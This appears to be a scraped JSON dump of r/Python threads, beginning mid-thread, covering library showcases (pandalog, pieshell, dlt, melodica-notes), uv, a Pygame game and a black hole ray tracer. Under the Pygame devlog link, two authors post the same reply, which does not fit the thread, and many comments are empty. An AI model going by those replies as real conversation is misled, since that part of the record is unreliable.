            "content": "our passion lies in coding, not in reptiles Speak for yourself 🐍",
            "replies": [
                {
                    "author": "christopher_86",
                    "score": "31",
                    "content": "Ssssssspeak four yourssssself 🐍"
                }
            ]
        },
        {
            "author": "Darwinmate",
            "score": "60",
            "content": "Yeah I agree. More Monty Python themed articles!"
        },
        {
            "author": "GXWT",
            "score": "37",
            "content": "What photo should they use? Generic binary code hacker backgrounds instead?",
            "replies": [
                {
                    "author": "smarterthanyoda",
                    "score": "24",
                    "content": "Dead parrots would be truer to the roots of the language.",
                    "replies": [
                        {
                            "author": "bitspace",
                            "score": "11",
                            "content": "It's not dead. It's resting.",
                            "replies": [
                                {
                                    "author": "solreaper",
                                    "score": "3",
                                    "content": "This sir, is an ex parot"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "trollsong",
            "score": "10",
            "content": "looks at the logo Hmmmm"
        },
        {
            "author": "matjaz_b",
            "score": "9",
            "content": "Its always pythons and never Monty Pythons. For some topic they should include a picture of Gumby."
        },
        {
            "author": "the_hoser",
            "score": "17",
            "content": "I like the snakes."
        },
        {
            "author": "Orio_n",
            "score": "8",
            "content": "So what do you want instead? Portraits of Guido?"
        },
        {
            "author": "emedan_mc",
            "score": "12",
            "content": "I’ve had it with these snakes."
        }
    ]
},
{
    "post_author": "PossiblePandaYT",
    "post_id": "1dcnr8p",
    "post_score": "0",
    "post_time": "Monday, June 10, 2024 at 6:06:41 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I have made an open source library for logging errors / messages :)",
    "media": [
        "https://github.com/PossiblePanda/pandalog"
    ],
    "post_content": "What my project does\nAllow developers to easily log errors, messages, and warnings to the console, and an optional log file.\nHave you ever released a project, and then somebody runs your project and encounter an error, and you need to see their console? No worries, pandalog can store logs in a file wherever you choose. You can also have errors automatically be sent in the console & log through pandalog.\nTarget Audience\nDevelopers\nComparison\nusing pandalog has many benefits over just using print, such as storing logs in a log file, colored output in console, extremely configurable\nYou can download it on pypi by running pip install pandalog\nGitHub: https://github.com/PossiblePanda/pandalog\nContributors are appreciated :)",
    "comments": [
        {
            "author": "sadclass08",
            "score": "58",
            "content": "Python already comes with a builtin logging module. You can read the documentation here. The only feature you are adding is colour but that’s also available have a look here",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "8",
                    "content": "Thanks! Unfortunate because I spent a while making it and didn't know lol",
                    "replies": [
                        {
                            "author": "ogaat",
                            "score": "20",
                            "content": "Confessions like this are a vote against adopting a solution because they mean the person has not looked far and deep for a solution to a problem. Built-ins have the advantage of being used much more than the needs of an individual and thus can be more robust. Their downside is that they can be built by committee and can get too heavy or too light for use. That creates the opportunity. The best next generation solutions can precisely articulate the problem with the current generation they are attempting to solve.",
                            "replies": [
                                {
                                    "author": "Graphacil",
                                    "score": "-4",
                                    "content": "what the fk are u even trying to say?"
                                },
                                {
                                    "author": "PossiblePandaYT",
                                    "score": "-9",
                                    "content": ""
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ekbravo",
            "score": "22",
            "content": ""
        },
        {
            "author": "ChimpanzeChapado",
            "score": "17",
            "content": "As someone with 18 years of experience in software engineering, the last thing I would do in my life would be adopting a library for something as important and meaningful as observability made by someone that doesn't know the basics of the language they used. I'm guessing OP is younger than my career, but that's just a guess."
        },
        {
            "author": "chunkyasparagus",
            "score": "14",
            "content": "This kind of thing really ruins this sub. I used to enjoy reading about python stuff here, but recently it's just posts by people who don't know that logging exists, or the twentieth incorrect article about decorators, or other rubbish. logging is the built-in library for generating log messages. It's maybe not the best and most wonderful library in the world, but it's the only library that you should consider if you're writing code that will be used by others, because then they can use the built-in functionality to control whether or not they will see log messages from your package.",
            "replies": [
                {
                    "author": "thedeepself",
                    "score": "1",
                    "content": "it's the only library that you should consider if you're writing code that will be used by others, because then they can use the built-in functionality to control whether or not they will see log messages from your package. this is debatable. There are well-informed 3rd party logging packages (e.g. structlog and loguru) that were written by people who were well-educated about the ins and outs of the standard logging library before they undertook their efforts."
                }
            ]
        },
        {
            "author": "Mews75",
            "score": "8",
            "content": "Yeah maybe it already exists but its still a cool project, don't let the negative comments affect you :)"
        },
        {
            "author": "yaxriifgyn",
            "score": "1",
            "content": "Too many newcomers to Python (or any subject domain) don't get to know it well enough before they think themselves to be experts in the field. For Python, my recommendation is that you read or at worst scan, all the documents that were installed beside the Python executables and libraries when you install the official release from https://www.python.org/ and you do the same for any package you install from https://www.python.org/ or read/scan all the Python online documentation at these web sites. Then, you will not be wasting time reinventing the wheel."
        },
        {
            "author": "thedeepself",
            "score": "1",
            "content": "from pandalog import logger logger.logInfo(\"This is a message\", \"TEST\") have you heard of PEP-8?",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "1",
                    "content": "yap yap yap, if you don't have anything meaningful to say get outta here"
                }
            ]
        }
    ]
},
{
    "post_author": "17thCurlyBrace",
    "post_id": "1dfsjdu",
    "post_score": "0",
    "post_time": "Friday, June 14, 2024 at 5:44:52 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "how about one-line try-except statement ?",
    "media": [],
    "post_content": "is there a proposal for a shorter exception handling syntax for those very frequent cases where a library function doesn't return \"error value\" like str.index ?\nsomething like instead of :\ntry:\n    i = my_str.index(\"sub\", st, en)\nexcept ValueError: # if \"sub\" has not been found\n    pass\nelse:\n    # do stuff with i (note that i usually want independent error handling here)\nsomething like this :\ni = my_str.index(\"sub\", st, en) except ValueError -1 # or maybe even return here\nif i == -1: # also can return right away if i want to avoid an indent next\n    # do stuff with i ...\ni suspect there might be something \"un-pythonic\" here in what i am imagining , but please forgive me if that's the case . i am a fan of Python for many years , but haven't really invested any time in learning the philosophy\nso i am interested in what the community thinks about this , how ok would such syntax be from the point of the \"Python way\" , and if there is such a proposal i would like to know if i can consider maybe voting on it somehow",
    "comments": [
        {
            "author": "james_pic",
            "score": "4",
            "content": "It fits a little awkwardly with \"there should be one, and ideally only one, obvious way to to it\". I know this was part of the reason they held off adding ternary operators on the early days (although of course they have them now). Speaking for myself, I can't think of many times when I've worked with code that this would help with. And I know they don't like to add language syntax unless it solves quite a lot of people's problems well. For something like your use case, where you're dealing with a common and expected case, it would be common to have an alternate method that returns a sentinel value. And indeed there is such a method, str.find."
        },
        {
            "author": "Severe_Inflation5326",
            "score": "3",
            "content": ""
        },
        {
            "author": "treyhunner",
            "score": "3",
            "content": "There was a PEP for a similar syntax: https://legacy.python.org/dev/peps/pep-0463/#proposal Guido van Rossum discussed it in his PyCon 2014 keynote and noted that he didn't think saving a couple lines of code was worthwhile enough for the new syntax proposed.",
            "replies": [
                {
                    "author": "17thCurlyBrace",
                    "score": "2",
                    "content": "interesting , thanks"
                }
            ]
        },
        {
            "author": "MeGaNeKoS",
            "score": "2",
            "content": "i = my_str.index(\"sub\", st, en) except ValueError -1 except TypeError -2 except Exception -3 expect -4"
        }
    ]
},
{
    "post_author": "DaFluffyPotato",
    "post_id": "ggt5ld",
    "post_score": "3457",
    "post_time": "Sunday, May 10, 2020 at 5:31:23 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I'm developing a game with Python and Pygame!",
    "media": [
        "https://preview.redd.it/jogf31rlmux41.gif?width=640&crop=smart&format=png8&s=33ca84e1e126c4783493844016dd392f336a14c2"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ToothpasteTimebomb",
            "score": "196",
            "content": "The way that water moves... that’s slick.",
            "replies": [
                {
                    "author": "LordRyloth",
                    "score": "66",
                    "content": "Ikr.. I wanted him to go in the deeper waters just to check the animation"
                },
                {
                    "author": "AztecComputer",
                    "score": "28",
                    "content": "How does that work, OP?",
                    "replies": [
                        {
                            "author": "DaFluffyPotato",
                            "score": "28",
                            "content": "I explained it in my devlog series I’m working on. https://www.youtube.com/playlist?list=PLX5fBCkxJmm1F3PofHWCGNH6se7QO7L3d",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "",
                                    "content": "I'm not sure what those abbreviations mean, but what you're describing matches what I dealt with.",
                                    "replies": [
                                        {
                                            "author": "DaFluffyPotato",
                                            "score": "8",
                                            "content": "I'm not sure what those abbreviations mean, but what you're describing matches what I dealt with."
                                        }
                                    ]
                                },
                                {
                                    "author": "myusuf3",
                                    "score": "2",
                                    "content": "Very cool dude"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "deyehaus",
            "score": "373",
            "content": "This terraria update looks nuts"
        },
        {
            "author": "DaFluffyPotato",
            "score": "140",
            "content": "I do everything myself (artwork included). I'm planning on releasing the source when I release the early version of the game. (should be a couple months or so) I'm also working on a series of devlogs for this project if anyone is interested. This project is actually running in Pygame 2 for this gif, which is part of the reason behind the performance. I'm open to answering any questions! :D"
        },
        {
            "author": "PonyKillerMX",
            "score": "13",
            "content": "Great work man, how long hv u been in this ?"
        },
        {
            "author": "KFUP",
            "score": "23",
            "content": "Not sure how serious you are about polishing this game, but if you are, then I suggest releasing versions early to get feedback before getting too deep and building your game over bad design decisions that will bite you later, for example, the jump looks extremely floaty, there are some good articles about jump feel: http://www.digra.org/wp-content/uploads/digital-library/paper_248.pdf"
        },
        {
            "author": "hamoliciousRUS",
            "score": "11",
            "content": "I love how the water moves! I also just noticed the gusts of wind and how the environment responds to them... amazing!"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "Looks good. How do you do the artwork?"
        },
        {
            "author": "PR3V3X",
            "score": "12",
            "content": "Looks dope. Can you drop the github. I'd love to stay current with it."
        },
        {
            "author": "YoelkiToelki",
            "score": "6",
            "content": "I would love to see the code on how u get the floating leaves in the air to look so smooth and good"
        },
        {
            "author": "petertiny1",
            "score": "6",
            "content": "Whenever I do any pygame, the frame rate instantly dies"
        }
    ]
},
{
    "post_author": "Severe_Inflation5326",
    "post_id": "1dhhohd",
    "post_score": "23",
    "post_time": "Monday, June 17, 2024 at 12:21:46 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pieshell: python for shell scripting and as an interactive shell",
    "media": [
        "https://github.com/redhog/pieshell"
    ],
    "post_content": "Pieshell is a Python shell environment that combines the expressiveness of shell pipelines with the power of python iterators.\nIt can be used in two major ways:\nAs an interactive shell replacing e.g. bash\nAs an ordinary python module replacing e.g. subprocess.Popen\nObligatory example:\n140:/home/oven/pieshell >>> for x in ls(-a) | tr(\"s\", \"S\"):\n...   if x.endswith('.py'):\n...      print x\n... \nSetup.py\nSource code: https://github.com/redhog/pieshell\nWhat the project does\nIt's a replacement for the subprocess module, and for bash as an interactive shell, and makes interacting with shell pipelines easier.\nTarget Audience\nSystem administrators, system software developers, data scientists\nComparison\nWhile os.system is very limited but easy to use, subprocess.Popen offers a lot of flexibility, but the interface is very low level. Any actual pipelining of multiple programs is pretty much required to be done by e.g. a bash process, constructing the pipeline as a shell script string. Further, interacting with standard in and standard out requires careful IO handling.\nPieshell on the other hand lets you construct pipelines as python objects. Standard io from a pipeline can be handled using iterators or async iterators. Pieshell has full asyncio integration.",
    "comments": [
        {
            "author": "Muhznit",
            "score": "13",
            "content": "Alternate shells are always a cool project, but what are the advantages over xonsh?",
            "replies": [
                {
                    "author": "Severe_Inflation5326",
                    "score": "3",
                    "content": "Xonsh introduces new syntax, and as such, can not just be imported as a python module with \"import modulename\" from a normal Python. Nor can their shell pipelines be introspected or subclasesed or assigned to variables. Pieshell on the other hand consists of just ordinary python classes that trickily overloads the right operators to get a nice syntax within the standard python syntax. That is, it only provides new semantics. You can use pieshell as a normal python module in any python project, without changing the interpreter used (/usr/bin/python3.11 or the like), just by importing it."
                },
                {
                    "author": "balder1993",
                    "score": "1",
                    "content": "This seems really nice, thanks for showing it."
                }
            ]
        },
        {
            "author": "weazelb0y",
            "score": "6",
            "content": "I usually reach for https://github.com/tomerfiliba/plumbum when I need to interact with a process/non python supported binary. I feel ipython + plumbum come close to replacing a shell, at least for me, who codes in Python all day. I tried Xonsh a few times and unfortunately found bugs pretty quickly. Maybe it's better now."
        },
        {
            "author": "AveryFreeman",
            "score": "1",
            "content": "I've often thought having python as a command interpreter might be cool, but how would one deal with Python versioning through tools like venv, pyenv, rye, etc.?",
            "replies": [
                {
                    "author": "Severe_Inflation5326",
                    "score": "1",
                    "content": "You can install pieshell either globally, or in a virtualenv. Pieshell supports running the env/bin/activate bash script(!) directly to activate a virtualenv (use bashsource(\"env/bin/activate\")). Note that this activates the virtualenv for any python program started from pieshell (just like any program started from bash after running the same script). This is different from importing / execing env/bin/activate_this.pywhich makes modules in the virtualenv available to the python or pieshell process itself. This obviously only work if they share python version, just like when run from a normal python."
                }
            ]
        }
    ]
},
{
    "post_author": "Thinker_Assignment",
    "post_id": "1da5uvv",
    "post_score": "20",
    "post_time": "Friday, June 7, 2024 at 11:39:23 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Instant Python pipeline from OpenAPI spec",
    "media": [
        "https://github.com/dlt-hub/dlt-init-openapi",
        "https://untitleddata.company/blog/How-to-create-a-dlt-source-with-a-custom-authentication-method-rest-api-vs-airbyte-low-code",
        "https://www.youtube.com/watch?v=b99qv9je12Q",
        "https://dlthub.com/docs/dlt-ecosystem/verified-sources/openapi-generator",
        "https://dlthub.com/docs/blog/rest-api-source-client",
        "https://github.com/dlt-hub/openapi-specs",
        "https://colab.research.google.com/drive/1MRZvguOTZj1MlkEGzjiso8lQ_wr1MJRI?usp=sharing"
    ],
    "post_content": "Hey folks, I work on dlt, the open source python library for turning messy jsons into clean relational tables or typed, clean parquet datasets.\nWe recently created 2 new tools: A python-dict based REST API extractor where you can just declare how to extract, and a tool that can init the above source fully configured by reading an OpenAPI spec. The generation of the pipes is algorithmic and deterministic, not LLM based.\nWhat My Project Does\ndlt-init-openapi, and the REST API toolkitare tool designed to simplify the creation of data pipelines by automating the integration with APIs defined by OpenAPI specifications. The pipelines generated are customizable Python pipelines that use the REST API source template that dlt offers (a declarative python-dict first way of writing pipelines).\nTarget Audience\ndlt-init-openapi is designed for data engineers, and other developers who frequently work with API data and require an efficient method to ingest and manage this data within their applications or services. It is particularly useful for those working in environments that support Python and is compatible with various operating systems, making it a versatile tool for both development and production environments.\ndlt's loader features automatic typing and schema evolution and processes data in microbatches to handle memory, reducing maintenance to almost nothing.\nComparison\nBoth the generation and the python declarative REST API source are new to our industry so it's hard to compare. dlt is open source and you will own your pipelines to run as you please in your existing orchestrators, as dlt is just a lightweight library that can run anywhere Python runs, including lightweight things like serverless functions.\ndlt is like requests + df.to_sql() on steroids, while the generator is similar to generators that create python clients for apis - which is what we basically do with extra info relevant to data engineering work (like incremental loading etc)\nSomeone from community created a blog post comparing it to Airbyte's low code connector: https://untitleddata.company/blog/How-to-create-a-dlt-source-with-a-custom-authentication-method-rest-api-vs-airbyte-low-code\nMore Info\nFor more detailed information on how dlt-init-openapi works and how you can integrate it into your projects, check out the links below:\nGitHub Repository for the tool\nOpenAPI specs repository you can use\nVideo Walkthrough\nColab Demo\nDocumentation and Quick Start Guide\nblog: REST API toolkit which helps understand how to edit the generated pipeline",
    "comments": [
        {
            "author": "sprne",
            "score": "2",
            "content": "wouldn't doc generated pydantic models make more sense than a dict? Is there any advantage to using dicts here?",
            "replies": [
                {
                    "author": "Thinker_Assignment",
                    "score": "2",
                    "content": "I think there's a misunderstanding of what the dict is. The dict is the definition of the pipeline. Go check the rest api link. For the api schema, that dlt will read from the data, you can use pydantic https://dlthub.com/docs/general-usage/schema-contracts#use-pydantic-models-for-data-validation",
                    "replies": [
                        {
                            "author": "sprne",
                            "score": "2",
                            "content": "understood, really cool library btw. I've had way too many issues unravelling nested json structures into tables, will give it a try. kudos!",
                            "replies": [
                                {
                                    "author": "Thinker_Assignment",
                                    "score": "1",
                                    "content": "Thank you! I appreciate the feedback!"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "jrmiranda",
    "post_id": "hb108j",
    "post_score": "3131",
    "post_time": "Thursday, June 18, 2020 at 12:51:40 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a ray tracer that simulates curved spacetime by using Einstein's field equations from general relativity. Here's a black hole!",
    "media": [
        "https://i.redd.it/yrcat3ndkj551.jpg",
        "https://preview.redd.it/yrcat3ndkj551.jpg?auto=webp&s=c70ba4e6d30f7a30e44312369af59fa44bf1b03b"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "CrispyNipsy",
            "score": "444",
            "content": "And here I am, just trying to get a margin on my image without it fucking with my border radius...",
            "replies": [
                {
                    "author": "I_Say_Fool_Of_A_Took",
                    "score": "181",
                    "content": "\"Code either works or it doesnt\" ~ Someone who has never made a GUI",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "20",
                            "content": "Just started doing GUI development for my side-gig 2 years ago. Holy cow does it add complexity and size to the code base. Now I know why so much of the software I used at the US DOE was command line based."
                        },
                        {
                            "author": "[deleted]",
                            "score": "26",
                            "content": "I made guis on ROBLOX"
                        },
                        {
                            "author": "CrispyNipsy",
                            "score": "26",
                            "content": ""
                        },
                        {
                            "author": "canbooo",
                            "score": "6",
                            "content": ""
                        },
                        {
                            "author": "ketchupfleck",
                            "score": "4",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "house_monkey",
                    "score": "19",
                    "content": ""
                },
                {
                    "author": "caifaisai",
                    "score": "5",
                    "content": "",
                    "replies": [
                        {
                            "author": "spaceinvader42069",
                            "score": "2",
                            "content": ""
                        }
                    ]
                }
            ]
        },
        {
            "author": "AnonMurphy",
            "score": "148",
            "content": ""
        },
        {
            "author": "[deleted]",
            "score": "16",
            "content": "Happy gargantua noises"
        },
        {
            "author": "TriG-tbh",
            "score": "37",
            "content": "I noticed that in the actual black hole, there's a thin 1px line of light similar to the outside of the black hole. What exactly causes this?"
        },
        {
            "author": "[deleted]",
            "score": "12",
            "content": "This is the best science or nuclear science thingy I've ever seen on this subreddit. Awesome OP. can't wait to see how the code works."
        },
        {
            "author": "k0042n",
            "score": "19",
            "content": "Can't wait to see the code that makes the this gorgeous art"
        },
        {
            "author": "virtualadept",
            "score": "16",
            "content": "Awesome! Nifty bit of Python there. Nice work."
        },
        {
            "author": "jrmiranda",
            "score": "8",
            "content": "Hey guys, thank you for your kind words(and for the gold). I trully appreciated the feedback! Here's the code: https://github.com/jrmiranda/blackhole_raytracer. Enjoy!"
        },
        {
            "author": "alemanimani",
            "score": "7",
            "content": "I cloooseee my eyeees and she slips aawaaaaaaaaaay"
        }
    ]
},
{
    "post_author": "Jaldekoa",
    "post_id": "h7qjw7",
    "post_score": "3089",
    "post_time": "Friday, June 12, 2020 at 9:44:40 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Replicating Face Mask Detection - OpenCV and MobileNetV2",
    "media": [
        "https://preview.redd.it/r9phf28hyi451.gif?width=640&crop=smart&format=png8&s=1037e4e3edcebbacea4f9ac682993a267d38b85d"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "AFutileBeing",
            "score": "225",
            "content": "ngl I looked at this for like 3 mins wondering when the gif would end...",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "54",
                    "content": "same lol, such a perfect loop"
                },
                {
                    "author": "CotoCoutan",
                    "score": "19",
                    "content": "r/PerfectPythonLoops the need for a new sub arises. Awesome work OP, keep it up!",
                    "replies": [
                        {
                            "author": "scihubfanboy",
                            "score": "22",
                            "content": "These are while and for."
                        },
                        {
                            "author": "[deleted]",
                            "score": "4",
                            "content": "Done lol"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Jaldekoa",
            "score": "104",
            "content": "Code: https://github.com/Jaldekoa/Replicating-Face-Mask-Detector",
            "replies": [
                {
                    "author": "ezekiel_grey",
                    "score": "17",
                    "content": "Forking this for my Person of Interest LARP Game."
                }
            ]
        },
        {
            "author": "battle_flyboy",
            "score": "27",
            "content": "I wonder, with the current situation on masks and not being able to use face unlock on phones when let wearing them...is there enough reliable data for a phone or any other device to reliably recognize the person with a mask? Even if the device needs data points of the normal face, phones do have it."
        }
    ]
},
{
    "post_author": "bettercallsenna",
    "post_id": "1dblgl3",
    "post_score": "23",
    "post_time": "Sunday, June 9, 2024 at 7:34:20 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Just released my first Python package: Melodica Notes 🎶",
    "media": [
        "https://pypi.org/project/melodica-notes/",
        "https://github.com/vhsenna/melodica-notes"
    ],
    "post_content": "Hey everyone!\nI’m excited to share my first Python package: Melodica Notes. It's a CLI tool aimed at helping melodica players with musical scales, chords, and harmonics.\nWhat My Project Does: Melodica Notes helps melodica players by providing easy access to musical scales, chords, and harmonic information directly from the command line. It's designed to be a simple yet powerful tool for both beginners and advanced players.\nTarget Audience: This project is meant for anyone who plays the melodica (or piano), from casual hobbyists to serious musicians. It's also a project for developers interested in music-related applications. While it’s fully functional, I consider it an evolving tool and welcome contributions to enhance its features.\nComparison: There are other musical tools out there, but Melodica Notes is specifically tailored for melodica players. Unlike general-purpose music theory tools, this CLI focuses on the needs and nuances of melodica playing, making it a unique addition to the musician's toolkit.\nI’d love to hear your thoughts and suggestions! Whether it's feedback, feature ideas, or pull requests, I welcome all contributions. Your insights can help make this tool even better.\nCheck it out on PyPI and feel free to dive into the code on GitHub.\nThanks for your support, and happy coding and playing 🎵",
    "comments": [
        {
            "author": "No-Arrival-872",
            "score": "5",
            "content": "I don't mean to be pessimistic, but why not just print out the scales and chord charts? Seems like it could just be a series of images? Melodica players...who are also python savvy. I do dig the ASCII art though!",
            "replies": [
                {
                    "author": "bettercallsenna",
                    "score": "1",
                    "content": "Because it's a CLI tool"
                }
            ]
        },
        {
            "author": "Mews75",
            "score": "3",
            "content": "Very cool project! Maybe a feature you could add in the future is generating images for the chords and scales (even though i really like the ascii art)"
        },
        {
            "author": "balder1993",
            "score": "1",
            "content": "The GitHub link is giving 404.",
            "replies": [
                {
                    "author": "bettercallsenna",
                    "score": "1",
                    "content": "thanks, I fixed it"
                }
            ]
        },
        {
            "author": "Maximum-Particular23",
            "score": "1",
            "content": "Qual a ideia? gerar melodias ou apenas mostras as escalas?",
            "replies": [
                {
                    "author": "bettercallsenna",
                    "score": "1",
                    "content": "Escalas, acordes e progressão harmônica. Está tudo lá na documentação. Deu um trabalhão escrever"
                }
            ]
        },
        {
            "author": "perfect-parquet",
            "score": "1",
            "content": "Have you tried exploring with the music21 python library? It contains a lot of support for music theory. For example, you can derive the notes for scales (https://web.mit.edu/music21/doc/moduleReference/moduleScale.html) and also derive the notes for chords (https://web.mit.edu/music21/doc/moduleReference/moduleChord.html) In theory you could leverage music21 to retrieve all music theory info, perform any required transformations, and then display it as ASCII art"
        }
    ]
},
{
    "post_author": "BaggiPonte",
    "post_id": "1desxf4",
    "post_score": "139",
    "post_time": "Thursday, June 13, 2024 at 10:09:33 AM GMT+3",
    "flair_text": "",
    "post_title": "uv added experimental commands for `uv add/remove`",
    "media": [
        "https://github.com/astral-sh/uv"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "KyxeMusic",
            "score": "61",
            "content": "I only use `uv` now for virtual environments and package installation. It's so damn fast that returning to vanilla pip feels extremely cumbersome. Look forward to it becoming the full fledged thing they want it to be.",
            "replies": [
                {
                    "author": "iamevpo",
                    "score": "10",
                    "content": "Isn't downloading packages the slowest part in both pip and uv? Also wonder if you know how uv compares to poetry (resolving may be a slow in poetry).",
                    "replies": [
                        {
                            "author": "KyxeMusic",
                            "score": "33",
                            "content": "Definitely not, package downloading is not a big bottleneck if your connect speed is decent. But the installation and resolving, in uv is almost instant, whereas it's quite slow in pip. Haven't used poetry much tbh .",
                            "replies": [
                                {
                                    "author": "zurtex",
                                    "score": "25",
                                    "content": "I've been working on pip performance for the last few years, and I've been reporting lots of issues to uv as I find them, and I would like to add a big \"it depends what you're doing\". Resolution can be the reason pip comparatively slow, but uv does a few things which speed it up far more significantly than resolution usually contributes to: It optimistically prefetches metadata It's carefully avoids downloading full packages when it only needs metadata It does multiple downloads concurrently It builds packages while it's downloading other packages It installs packages in parallel It caches resolution, metadata, and prepared installs, not packages. Pip could implement 2, 3, and 5. In fact there is a PR that's very likely to land to download in parallel for 24.2+, there is another PR to only use metadata when it needs but it's very complex and I don't know the chances of it landing, pip maintainers are very conservative on complex changes. I posted an issue to consider making parallel installs, but first it would be good if there's any obvious speed ups that can be made to installs before trying to run things in parallel, one of the maintainers is doing that. As for resolution, there are two categories of improvements that can be made, the first is speeding up and removing bottlenecks, quite a few of these landed for 24.1 (beta 2 is out now!) and more will make it for 24.2. And the second is improving the algorithm. uv's resolution is based on pubgrub-rs and is usually very good but has some known weaknesses. Where as pip's is based on resolvelib, which is a DFS approach which some specific optimizations split between the resolvelib and the pip codebase, it's two main weakness is it has multiple parts which are O( n2 ) and the implementation in pip can make them O( n3 ) or worse, and other other weakness it is doesn't always best implement CDCL (conflict-driven clause learning). I hope both situations improve significantly in the near future, but even if pip resolved faster than uv in most situations it would still be slower than uv because of the other issues I posted."
                                },
                                {
                                    "author": "iamevpo",
                                    "score": "2",
                                    "content": ""
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "CopOnTheRun",
                    "score": "4",
                    "content": ""
                }
            ]
        },
        {
            "author": "proof_required",
            "score": "37",
            "content": "",
            "replies": [
                {
                    "author": "ArabicLawrence",
                    "score": "19",
                    "content": ""
                },
                {
                    "author": "BaggiPonte",
                    "score": "8",
                    "content": ""
                },
                {
                    "author": "RevolutionaryFunny40",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "chub79",
            "score": "3",
            "content": "Python packaging is going to become such a smooth experience 😎 Already is with pdm in my book :)"
        },
        {
            "author": "rar_m",
            "score": "2",
            "content": "Can someone sell me on this? How can this be such a 'smooth experience' compared to appending a package name to a .txt file and running one command to install them? It's got built in commands to setup a virtual environment? Don't care, I already set it up with a single command anyways. It's faster? Don't care, this only helps deployment times which are heavily gated by unit tests, not pip installs. The only real troubles I run into with Python package management are packages that incorrectly define their compatibilities with other packages. So just including one package may brick an entirely different package just by having it installed. Or not being compatible with another package that just got updated and changed their interface. AFAIK these aren't problems a new CLI can fix. If it's better great, I guess I'll use it the next time I work on a project that already has it but otherwise, I don't see the point in adding in more complexity to solve problems I don't have.",
            "replies": [
                {
                    "author": "BaggiPonte",
                    "score": "5",
                    "content": "Can someone sell me on this? How can this be such a 'smooth experience' compared to appending a package name to a .txt file and running one command to install them? if you \"just write\" microservices code that's totally viable! I mostly deal with libraries/packages which happen to have a bunch of group dependencies, so a package manager helps a lot. When you have 2/3/4 optional + dev dependencies you have to have that many requirements files + write your setup.py. and good luck updating the versions or getting the dependency constraints right writing all by hand. IIRC if you need to uninstall a library you don't get the transitive dependencies removed - you have to do that by hand. plus you have to have all files for plugins (ruff/flake8/black/pytest/whatever) or maybe just a pyproject.toml but at that point you can write dependencies there (even by hand!). It's faster? Don't care, this only helps deployment times which are heavily gated by unit tests, not pip installs. actually been deploying minimal APIs powered by small and large ML models and pip installs were the gate. but I totally see your point 😊 For me it's about the devx more than the speed."
                }
            ]
        }
    ]
},
{
    "post_author": "NINTSKARI",
    "post_id": "1d9r9xa",
    "post_score": "193",
    "post_time": "Thursday, June 6, 2024 at 10:51:52 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What are the best Python projects you've worked on?",
    "media": [],
    "post_content": "Off with the hate, what have been the best Python projects you have worked on? What did the code look like? What were the standards? Why was it the best?",
    "comments": [
        {
            "author": "pingveno",
            "score": "221",
            "content": "I worked on Beautiful Soup a bit a while back. Its maintainer, Leonard Richardson, and his wife Sumana Harihareswara are both real treasures for the Python community. He coached me through my first real open source contribution. I was in my early twenties then, so it was helpful watching a seasoned developer explain decisions like release schedules to be minimally disruptive. Beautiful Soup is good quality code that has evolved for the past 20 years to stay relevant.",
            "replies": [
                {
                    "author": "mr-peabody",
                    "score": "57",
                    "content": "Leonard Richardson, and his wife Sumana Harihareswara are both real treasures for the Python community They were both on stage at year's PyCon (US) a few weeks ago 👍"
                },
                {
                    "author": "toxic_acro",
                    "score": "10",
                    "content": "In the morning before the first day of PyCon this year, I happened to meet Sumana on the walk to the convention center and she was the friendliest, nicest person I've ever talked to. Really set the weekend off on a great note for me and felt very welcomed for my first time going"
                }
            ]
        },
        {
            "author": "Traditional_Yogurt",
            "score": "66",
            "content": "As someone who works in the Financial industry, I noticed that it was quite hard to programmatically get an overview of each sector (e.g. agricultural sector and underlying industries per country). Yes, if you pay a hefty fee anything is possible but I wondered if I could build something with scrapers for free. This ended up almost melting my laptop as I had it turn on for 40 days straight constantly running queries to collect as many companies as possible while trying to categorize them. At one point I had a fan blowing at my laptop because I was scared it would destroy itself otherwise (and I was a poor student back then). That was a couple years ago and I think the project nowadays is being used by quite a lot of people! Currently, it collects new data on companies that go public or bankrupt every week via GitHub Actions and I am actually really proud of what it has become. The code itself is nothing to write home about though 🙃 This is the project"
        },
        {
            "author": "Icy_Bag_4935",
            "score": "61",
            "content": "I once got a job at tech unicorn by writing a Python library that can analyze poetry. This was back in 2017, way before ChatGPT was on scene.",
            "replies": [
                {
                    "author": "TheOrchidsAreAlright",
                    "score": "8",
                    "content": "I wrote a Python application to analyse poetry for my Master's final project! Really fun and I learned a lot"
                }
            ]
        },
        {
            "author": "fisadev",
            "score": "18",
            "content": "The project I'm working on. A planner that controls a fleet of space satellites using AI (from the optimization problems branch, not machine learning or the like). Mostly very well organized code, a super interesting problem to solve, challenging, and built as a lib so no db, frontend or UIs to deal with, pure algorithmic stuff."
        },
        {
            "author": "ishammohamed",
            "score": "8",
            "content": "I wrote an expression evaluator using eval fn in early 2010 as an API for a Windows Phone application and published in Google app engine in no time."
        },
        {
            "author": "Drumma_XXL",
            "score": "26",
